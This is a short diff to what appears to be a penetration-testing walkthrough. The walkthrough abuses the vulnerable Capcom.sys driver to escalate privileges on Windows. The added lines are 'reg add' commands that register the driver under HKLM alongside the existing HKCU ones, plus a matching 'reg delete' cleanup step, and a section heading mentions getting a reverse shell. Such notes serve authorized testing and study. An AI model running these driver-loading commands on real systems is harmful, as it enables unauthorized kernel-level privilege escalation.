@@ -61,6 +61,8 @@ Goal:
 > On modern systems, you must write to **HKLM**, which requires elevated admin.
 
 ```powershell
+reg add HKLM\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
+reg add HKLM\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
 reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
 reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
 ```
@@ -119,6 +121,7 @@ If you need a reverse shell or custom system command:
 ## **8. Cleanup**
 
 ```powershell
+reg delete HKLM\System\CurrentControlSet\Capcom /f
 reg delete HKCU\System\CurrentControlSet\Capcom /f
 ```
 
